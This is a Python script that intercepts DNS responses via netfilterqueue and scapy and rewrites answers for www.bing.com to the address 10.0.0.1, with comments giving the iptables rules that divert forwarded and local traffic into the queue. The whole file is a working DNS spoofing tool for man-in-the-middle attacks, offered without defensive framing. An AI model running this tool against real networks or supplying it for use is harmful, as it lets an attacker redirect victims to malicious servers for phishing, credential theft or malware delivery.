#!/usr/bin/env python3

import netfilterqueue  # For iptables queue management
import scapy.all as scapy

# Command to create iptables queue:
# iptables -I FORWARD -j NFQUEUE --queue-num 0  (For forwarding packets)
# iptables -I INPUT -j NFQUEUE --queue-num 0   (For local device)
# iptables -I OUTPUT -j NFQUEUE --queue-num 0  (For local device)
# iptables --flush (To reset before running)

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())  # Convert raw packet to Scapy packet

    if scapy_packet.haslayer(scapy.DNSRR):  # Check if the packet contains a DNS response
        qname = scapy_packet[scapy.DNSQR].qname.decode()  # Get the queried domain name

        if "www.bing.com" in qname:  # Check for target domain
            print(f"[+] Spoofing DNS request for {qname}")

            answer = scapy.DNSRR(rrname=qname, rdata="10.0.0.1")  # Spoofed IP address
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1  # Set response count

            # Delete checksums and length to let Scapy recalculate them
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            # Convert Scapy packet to bytes and set it as the new payload
            packet.set_payload(bytes(scapy_packet))

    packet.accept()  # Forward the packet

queue = netfilterqueue.NetfilterQueue()  # Initialize Netfilter queue
queue.bind(0, process_packet)  # Bind queue number 0 with callback function
print("[+] Waiting for packets...")
queue.run()  # Start processing packets
